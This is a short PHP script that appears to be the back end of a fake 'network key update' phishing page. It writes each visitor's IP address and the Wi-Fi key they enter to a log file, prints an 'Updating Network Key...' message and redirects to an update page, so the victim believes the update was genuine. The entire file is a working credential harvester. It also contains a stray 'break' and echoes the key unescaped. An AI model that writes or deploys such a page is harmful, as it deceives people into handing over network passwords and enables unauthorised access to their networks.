<?php
session_start();

ob_start();


$key1=$_POST['key1'];
$key2=$_POST['key2'];

if ($key1 != $key2) {
header("location:error.html");
break;
}


$file = fopen('log.txt', 'a');
fwrite($file, '' . $_SERVER['REMOTE_ADDR'] . '-' . $key2 . PHP_EOL);
fclose($file);

echo "Updating Network Key... $key1";
sleep(6);
header("location:update.html");

ob_end_flush();
?>
